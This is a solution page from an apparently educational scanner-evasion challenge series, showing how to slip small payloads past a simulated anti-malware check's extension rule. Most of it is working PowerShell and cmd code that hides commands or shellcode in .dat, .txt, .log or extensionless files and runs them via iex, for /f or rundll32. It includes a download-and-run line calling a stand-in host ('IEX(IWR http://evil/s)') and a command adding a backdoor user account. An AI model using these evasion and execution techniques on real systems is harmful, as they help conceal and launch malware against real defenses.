---
title: "Solution 21: Extension Avoidance (Small Executable)"
challenge_number: 21
difficulty: easy
category: "Small Executable Bypass"
permalink: /solutions/21-extension-avoidance-small/
---

# Solution: Extension Avoidance (Small Executable)

[Back to Challenge](../challenges/21-extension-avoidance-small.md)

## Overview

The small executable check requires **both** `file_size < 32` AND `isSuspiciousExtension() == true`. By using an extension not in the suspicious list (or no extension at all), you break the second condition. The file remains small and executable but is never flagged.

## Working Code

### Example 1: No Extension

```powershell
# Create a tiny shellcode file with NO extension
$shellcode = [byte[]](0xCC, 0x90, 0x90, 0xC3)  # int3, nop, nop, ret
[System.IO.File]::WriteAllBytes("payload", $shellcode)

Write-Host "File: payload (no extension)"
Write-Host "Size: $((Get-Item 'payload').Length) bytes"
# Size: 4 bytes - under 32, but no suspicious extension!
```

Execute it:
```cmd
:: Run directly (if file association exists or via explicit loader)
cmd /c payload

:: Or invoke via rundll32/another loader
rundll32.exe payload,EntryPoint
```

### Example 2: .dat Extension

```powershell
# Save as .dat - not in the suspicious extension list
$command = "whoami > out.txt"
Set-Content -Path "task.dat" -Value $command -NoNewline

Write-Host "File: task.dat"
Write-Host "Size: $((Get-Item 'task.dat').Length) bytes"
# Size: 16 bytes - under 32, but .dat is not suspicious
```

Execute it:
```cmd
:: Read and execute the content
cmd /c "for /f %i in (task.dat) do %i"

:: Or with PowerShell
powershell -c "iex(gc task.dat)"
```

### Example 3: .tmp Extension

```powershell
# .tmp is not in the suspicious list
$payload = "calc.exe"
Set-Content -Path "update.tmp" -Value $payload -NoNewline

Write-Host "File: update.tmp"
Write-Host "Size: $((Get-Item 'update.tmp').Length) bytes"
# Size: 8 bytes
```

Execute it:
```powershell
# Launch whatever is specified in the .tmp file
Start-Process (Get-Content "update.tmp" -Raw)

# Or via cmd
cmd /c "for /f `"delims=`" %a in (update.tmp) do start %a"
```

### Example 4: .txt Extension with Execution

```powershell
# .txt is completely benign - never in suspicious lists
$code = 'IEX(IWR http://evil/s)'  # 22 bytes - under 32
Set-Content -Path "notes.txt" -Value $code -NoNewline
```

Execute it:
```powershell
# PowerShell can execute content from any file regardless of extension
powershell -c "iex(gc notes.txt)"
```

### Example 5: Binary Shellcode as .log

```powershell
# Tiny shellcode saved as .log
$sc = [byte[]](0x48, 0x31, 0xC0, 0x48, 0x89, 0xC1, 0x0F, 0x05, 0xC3)  # 9 bytes
[System.IO.File]::WriteAllBytes("debug.log", $sc)

Write-Host "File: debug.log"
Write-Host "Size: 9 bytes (100% non-printable, but no checks trigger!)"
# Under 64 bytes: ratio check skipped
# Extension .log: small exe check skipped
```

### Example 6: Custom Extension (.xyz)

```powershell
# Completely made-up extension - scanner doesn't know about it
$script = "net user hack P@ss /add"  # 23 bytes
Set-Content -Path "config.xyz" -Value $script -NoNewline
```

Execute via file type association or explicit interpreter:
```cmd
cmd /c "for /f "tokens=*" %a in (config.xyz) do %a"
```

### Example 7: Rename from .exe to Extensionless

```powershell
# Original: tiny.exe (would be flagged - .exe + <32 bytes)
# Solution: remove the extension entirely
$stub = [byte[]](0x4D, 0x5A, 0x90, 0x00, 0x03)  # 5 bytes, MZ header start
[System.IO.File]::WriteAllBytes("stub", $stub)

# Execute with explicit path
Start-Process -FilePath ".\stub"
# Or via cmd
cmd /c ".\stub"
```

## Why It Works

The scanner's small executable check evaluates a logical AND:

```nim
if fileSize < 32 and isSuspiciousExtension(extension):
    result = MALICIOUS
```

The suspicious extension list is:
```
.exe, .bat, .cmd, .ps1, .vbs, .js, .wsf, .scr, .pif, .com, .hta
```

**Extensions NOT in the list** (and thus safe to use):

| Extension | Why it works | How to execute |
|-----------|-------------|----------------|
| (none) | No extension = no match | `cmd /c .\payload` or explicit loader |
| `.dat` | Generic data file | `powershell -c "iex(gc file.dat)"` |
| `.tmp` | Temporary file | `cmd /c "for /f %a in (f.tmp) do %a"` |
| `.txt` | Text file | `powershell -c "iex(gc file.txt)"` |
| `.log` | Log file | Read + execute in memory |
| `.cfg` | Config file | Parsed by custom loader |
| `.bin` | Binary data | Loaded by shellcode runner |
| `.db`  | Database file | Read + inject |
| `.bak` | Backup file | Rename at runtime |

### The Logic Gap

The scanner assumes:
1. Small files + executable extensions = suspicious droppers/stagers
2. Small files + non-executable extensions = harmless data fragments

This assumption fails because:
- **File extensions don't control executability** — any file can be executed if you invoke it through the right interpreter
- **Windows doesn't require extensions** — files can run without them
- **The extension list is finite** — there are infinite possible extensions the scanner doesn't track

### Execution Without Suspicious Extensions

Windows provides multiple ways to execute content regardless of file extension:

```powershell
# PowerShell: execute ANY text file as code
iex (Get-Content "payload.dat" -Raw)

# Cmd: read and execute lines from any file
for /f "tokens=*" %a in (payload.tmp) do @%a

# Binary: load shellcode from any file into memory
$bytes = [System.IO.File]::ReadAllBytes("payload.bin")
# ... allocate memory, copy, execute via delegate ...
```

The scanner only sees the file at rest. It cannot predict or prevent how the file will be used at runtime.

## How to Verify

1. Create a small file WITH a suspicious extension (will be detected):
   ```powershell
   Set-Content -Path "test.bat" -Value "whoami" -NoNewline
   Write-Host "Size: $((Get-Item 'test.bat').Length) bytes, Extension: .bat"
   # Size: 6, Extension: suspicious → FLAGGED
   ```

2. Create the same content WITHOUT a suspicious extension:
   ```powershell
   Set-Content -Path "test.dat" -Value "whoami" -NoNewline
   Write-Host "Size: $((Get-Item 'test.dat').Length) bytes, Extension: .dat"
   # Size: 6, Extension: not suspicious → PASSES
   ```

3. Scan both:
   ```
   nim_antimalware_sim.exe test.bat
   nim_antimalware_sim.exe test.dat
   ```

4. Expected results:
   - `test.bat`: **FLAGGED** — size < 32 AND extension is suspicious
   - `test.dat`: **Not flagged** — size < 32 BUT extension is not suspicious

5. Verify the content is still executable:
   ```powershell
   powershell -c "iex(gc test.dat)"
   # Output: DESKTOP-XXXXX\username (whoami runs successfully)
   ```

6. Test with no extension at all:
   ```powershell
   Set-Content -Path "payload" -Value "whoami" -NoNewline
   # nim_antimalware_sim.exe payload → No detection
   cmd /c "powershell -c iex(gc payload)"
   # Output: username (still executes)
   ```
